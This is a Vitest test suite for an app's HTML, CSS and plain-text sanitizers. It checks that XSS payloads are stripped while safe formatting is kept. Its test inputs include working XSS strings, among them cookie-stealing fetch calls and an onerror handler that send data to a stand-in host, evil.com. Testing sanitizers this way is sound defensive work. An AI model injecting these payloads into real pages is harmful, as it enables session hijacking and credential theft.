/**
 * Security Tests for HTML Sanitization
 * 
 * These tests verify that the sanitization utilities effectively block XSS attacks
 * while allowing safe HTML formatting to pass through.
 * 
 * @security XSS Prevention Testing
 */

import { describe, it, expect } from 'vitest';
import { sanitizeHTML, sanitizeCSS, sanitizePlainText } from '../utils/sanitize';

describe('sanitizeHTML - XSS Attack Prevention', () => {
  describe('Script Injection Attacks', () => {
    it('should block <script> tags', () => {
      const malicious = '<script>alert("XSS")</script>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('alert');
    });

    it('should block <script> tags with content', () => {
      const malicious = 'Hello <script>alert("XSS")</script> World';
      const result = sanitizeHTML(malicious);
      expect(result).toContain('Hello');
      expect(result).toContain('World');
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('alert');
    });

    it('should block inline script tags with various payloads', () => {
      const payloads = [
        '<script>document.cookie</script>',
        '<script src="evil.js"></script>',
        '<script>fetch("https://evil.com?data="+document.cookie)</script>',
      ];

      payloads.forEach(payload => {
        const result = sanitizeHTML(payload);
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('</script>');
      });
    });
  });

  describe('Event Handler Attacks', () => {
    it('should block onerror event handlers', () => {
      const malicious = '<img src=x onerror=alert("XSS")>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('alert');
    });

    it('should block onclick event handlers', () => {
      const malicious = '<div onclick="alert(\'XSS\')">Click me</div>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('alert');
    });

    it('should block various event handlers', () => {
      const handlers = [
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onchange=alert("XSS")>',
        '<textarea onkeypress=alert("XSS")>',
        '<img onmouseover=alert("XSS")>',
      ];

      handlers.forEach(handler => {
        const result = sanitizeHTML(handler);
        expect(result).not.toContain('onload');
        expect(result).not.toContain('onfocus');
        expect(result).not.toContain('onchange');
        expect(result).not.toContain('onkeypress');
        expect(result).not.toContain('onmouseover');
        expect(result).not.toContain('alert');
      });
    });
  });

  describe('JavaScript Protocol Attacks', () => {
    it('should block javascript: protocol in links', () => {
      const malicious = '<a href="javascript:alert(\'XSS\')">Click</a>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('alert');
    });

    it('should block javascript: with encoding variations', () => {
      const variations = [
        '<a href="javascript:alert(1)">link</a>',
        '<a href="JAVASCRIPT:alert(1)">link</a>',
        '<a href="jAvAsCrIpT:alert(1)">link</a>',
      ];

      variations.forEach(variation => {
        const result = sanitizeHTML(variation);
        expect(result.toLowerCase()).not.toContain('javascript:');
      });
    });
  });

  describe('Data URI Attacks', () => {
    it('should block data: URIs with embedded scripts', () => {
      const malicious = '<img src="data:text/html,<script>alert(\'XSS\')</script>">';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('data:');
      expect(result).not.toContain('<script>');
    });

    it('should block data: URIs in various contexts', () => {
      const contexts = [
        '<a href="data:text/html,<script>alert(1)</script>">link</a>',
        '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
      ];

      contexts.forEach(context => {
        const result = sanitizeHTML(context);
        expect(result).not.toContain('data:');
      });
    });
  });

  describe('HTML Tag Injection', () => {
    it('should block <iframe> tags', () => {
      const malicious = '<iframe src="https://evil.com"></iframe>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('<iframe');
      expect(result).not.toContain('</iframe>');
    });

    it('should block <object> and <embed> tags', () => {
      const malicious = '<object data="evil.swf"></object><embed src="evil.swf">';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('<object');
      expect(result).not.toContain('<embed');
    });

    it('should block <svg> with embedded scripts', () => {
      const malicious = '<svg onload=alert("XSS")></svg>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('<svg');
      expect(result).not.toContain('onload');
    });
  });

  describe('Style Injection Attacks', () => {
    it('should block <style> tags with malicious content', () => {
      const malicious = '<style>body{background:url("javascript:alert(1)")}</style>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('<style>');
      expect(result).not.toContain('javascript:');
    });

    it('should block style attributes with expressions', () => {
      const malicious = '<div style="background:expression(alert(1))">test</div>';
      const result = sanitizeHTML(malicious);
      expect(result).not.toContain('expression');
    });
  });

  describe('Legitimate Content Preservation', () => {
    it('should allow bold text with <strong>', () => {
      const safe = '<strong>Bold Text</strong>';
      const result = sanitizeHTML(safe);
      expect(result).toContain('<strong>');
      expect(result).toContain('Bold Text');
      expect(result).toContain('</strong>');
    });

    it('should allow italic text with <em>', () => {
      const safe = '<em>Italic Text</em>';
      const result = sanitizeHTML(safe);
      expect(result).toContain('<em>');
      expect(result).toContain('Italic Text');
      expect(result).toContain('</em>');
    });

    it('should allow basic formatting tags', () => {
      const safe = '<p>Paragraph with <strong>bold</strong> and <em>italic</em></p>';
      const result = sanitizeHTML(safe);
      expect(result).toContain('<p>');
      expect(result).toContain('<strong>');
      expect(result).toContain('<em>');
      expect(result).toContain('Paragraph');
    });

    it('should allow safe links with https protocol', () => {
      const safe = '<a href="https://example.com">Safe Link</a>';
      const result = sanitizeHTML(safe);
      expect(result).toContain('<a');
      expect(result).toContain('href="https://example.com"');
      expect(result).toContain('Safe Link');
    });

    it('should allow lists', () => {
      const safe = '<ul><li>Item 1</li><li>Item 2</li></ul>';
      const result = sanitizeHTML(safe);
      expect(result).toContain('<ul>');
      expect(result).toContain('<li>');
      expect(result).toContain('Item 1');
      expect(result).toContain('Item 2');
    });

    it('should allow line breaks', () => {
      const safe = 'Line 1<br>Line 2';
      const result = sanitizeHTML(safe);
      expect(result).toContain('<br>');
      expect(result).toContain('Line 1');
      expect(result).toContain('Line 2');
    });
  });

  describe('Mixed Content - Attack + Legitimate', () => {
    it('should sanitize attacks while preserving safe content', () => {
      const mixed = '<p><strong>Important:</strong> <script>alert("XSS")</script>This is safe text.</p>';
      const result = sanitizeHTML(mixed);
      
      expect(result).toContain('<p>');
      expect(result).toContain('<strong>Important:</strong>');
      expect(result).toContain('This is safe text.');
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('alert');
    });

    it('should handle AI-generated markdown with attacks', () => {
      const aiContent = '**Bold text** with <img src=x onerror=alert(1)> and more text';
      const result = sanitizeHTML(aiContent);
      
      expect(result).toContain('Bold text');
      expect(result).toContain('more text');
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('alert');
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty string', () => {
      const result = sanitizeHTML('');
      expect(result).toBe('');
    });

    it('should handle plain text without HTML', () => {
      const plain = 'Just plain text';
      const result = sanitizeHTML(plain);
      expect(result).toBe('Just plain text');
    });

    it('should handle malformed HTML', () => {
      const malformed = '<div>Unclosed div with <script>alert(1)';
      const result = sanitizeHTML(malformed);
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('alert');
    });

    it('should handle deeply nested attacks', () => {
      const nested = '<div><div><div><script>alert(1)</script></div></div></div>';
      const result = sanitizeHTML(nested);
      expect(result).not.toContain('<script>');
    });
  });
});

describe('sanitizeCSS - CSS Injection Prevention', () => {
  it('should remove script tags from CSS content', () => {
    const malicious = '.class { color: red; } <script>alert("XSS")</script>';
    const result = sanitizeCSS(malicious);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('alert');
  });

  it('should handle plain CSS text', () => {
    const css = '.class { color: red; }';
    const result = sanitizeCSS(css);
    expect(result).toContain('color: red');
  });

  it('should block HTML tags in CSS', () => {
    const malicious = '<style>body { background: red; }</style>';
    const result = sanitizeCSS(malicious);
    expect(result).not.toContain('<style>');
    expect(result).not.toContain('</style>');
  });

  it('should handle empty string', () => {
    const result = sanitizeCSS('');
    expect(result).toBe('');
  });
});

describe('sanitizePlainText - Text Stripping', () => {
  it('should strip all HTML tags', () => {
    const html = '<p>Hello <strong>World</strong></p>';
    const result = sanitizePlainText(html);
    expect(result).not.toContain('<p>');
    expect(result).not.toContain('<strong>');
    expect(result).toContain('Hello');
    expect(result).toContain('World');
  });

  it('should remove script tags and content', () => {
    const malicious = 'Text <script>alert("XSS")</script> more text';
    const result = sanitizePlainText(malicious);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('alert');
    expect(result).toContain('Text');
    expect(result).toContain('more text');
  });

  it('should handle plain text', () => {
    const plain = 'Just plain text';
    const result = sanitizePlainText(plain);
    expect(result).toBe('Just plain text');
  });

  it('should handle empty string', () => {
    const result = sanitizePlainText('');
    expect(result).toBe('');
  });
});

describe('Real-World Attack Scenarios', () => {
  it('should block session hijacking attempt', () => {
    const attack = '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';
    const result = sanitizeHTML(attack);
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('fetch');
    expect(result).not.toContain('document.cookie');
  });

  it('should block credential theft attempt', () => {
    const attack = '<form action="https://evil.com"><input name="password" type="password"></form>';
    const result = sanitizeHTML(attack);
    expect(result).not.toContain('<form');
    expect(result).not.toContain('action=');
  });

  it('should block DOM-based XSS', () => {
    const attack = '<div id="x"></div><script>document.getElementById("x").innerHTML="<img src=x onerror=alert(1)>"</script>';
    const result = sanitizeHTML(attack);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('innerHTML');
  });

  it('should handle AI response with markdown and potential XSS', () => {
    const aiResponse = '**Financial Summary**\n\n<img src=x onerror=alert(document.cookie)>\n\nYour spending is high.';
    const result = sanitizeHTML(aiResponse);
    
    expect(result).toContain('Financial Summary');
    expect(result).toContain('Your spending is high');
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('alert');
    expect(result).not.toContain('document.cookie');
  });
});
